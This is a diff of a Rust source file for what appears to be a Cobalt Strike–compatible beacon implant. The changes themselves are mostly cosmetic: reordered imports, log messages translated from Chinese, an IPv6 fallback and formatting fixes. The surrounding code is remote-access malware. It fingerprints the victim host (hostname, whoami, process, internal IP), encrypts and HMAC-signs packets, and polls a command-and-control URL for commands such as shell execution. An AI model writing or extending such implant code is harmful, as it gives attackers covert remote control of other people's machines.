@@ -5,35 +5,32 @@ use std::{
     fmt::format,
     fs,
     io::{BufReader, Read},
-    net::{Ipv4Addr, SocketAddr, SocketAddrV4, IpAddr},
+    net::{IpAddr, Ipv4Addr, SocketAddr, SocketAddrV4},
     os::raw,
     process::Command,
     vec,
 };
 // use sha2::Sha256;
 use bytes::{BufMut, BytesMut};
-use hmac::{Hmac, Mac};
 use rsa::{pkcs8::DecodePublicKey, PaddingScheme, PublicKey, RsaPrivateKey, RsaPublicKey};
 use sha2::{Digest, Sha256, Sha512};
 // use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
 use byteorder::{ReadBytesExt, BE};
+use crypt::*;
 use crypto::{
     aes::{self, KeySize},
     blockmodes::PaddingProcessor,
     buffer::{BufferResult, ReadBuffer, RefReadBuffer, WriteBuffer},
     symmetriccipher,
 };
-use std::io::Cursor;
 use local_ip_address::local_ip;
-use crypt::*;
 use profile::{C2_GET_URL, C2_POST_URL, PUB_KEY, USER_AGENT};
+use std::io::Cursor;
 use utils::*;
-
 
 mod crypt;
 mod profile;
 mod utils;
-
 
 const CMD_TYPE_SLEEP: u32 = 4;
 const CMD_TYPE_SHELL: u32 = 78; //0x4E
@@ -201,19 +198,22 @@ impl Beacon {
         let user_name = win_os_system("whoami").unwrap_or("unknow_name".into());
         let local_ip = match local_ip() {
             Ok(ip) => {
-                println!("本机的内网 IP 地址是: {:?}", ip);
+                println!("Local internal IP address is: {:?}", ip);
                 ip
-            },
+            }
             Err(e) => {
-                eprintln!("无法获取内网 IP 地址: {}", e);
+                eprintln!("Unable to obtain the internal network IP address: {}", e);
                 IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
             }
         };
         let mut ip_bytes = match local_ip {
             IpAddr::V4(ipv4) => ipv4.octets().to_vec(),
-            IpAddr::V6(ipv6) => ipv6.octets().to_vec(),
+            IpAddr::V6(_) => {
+                eprintln!("Getting an IPv6 address and returning 127.0.0.1");
+                Ipv4Addr::new(127, 0, 0, 1).octets().to_vec()
+            }
         };
-        //进行反转--要不然cs不能正常显示
+        //reverse the byte--otherwise the CS display will not be normal
         ip_bytes.reverse();
         let os_info = format!("{}\t{}\t{}", &host_name, &user_name, &process_name).into_bytes();
         let locale_ansi = 936u16;
@@ -254,7 +254,6 @@ impl Beacon {
         let pkg = base64::encode_config(enc_pkg, base64::STANDARD);
         Ok(pkg)
     }
-
 }
 
 fn main() {
@@ -266,7 +265,7 @@ fn main() {
         Some("macOS") => beacon.linux_collect_info(),
         _ => beacon.linux_collect_info(),
     }
-        .unwrap_or_else(|_| panic!("collect info error"));
+    .unwrap_or_else(|_| panic!("collect info error"));
     let mut counter = 1u32;
     println!("starting connect to {}", C2_GET_URL);
     loop {
@@ -371,7 +370,7 @@ fn reply_pkg(data: &[u8]) -> Vec<u8> {
         &reply_type.to_be_bytes()[..],
         &data,
     ]
-        .concat();
+    .concat();
     let raw_pkg_encrypted = aes_encrypt(&raw_pkg.as_slice(), aes_key, iv).unwrap();
     let hash = hmac_hash(hmac_key, raw_pkg_encrypted.as_slice());
     let buf = [
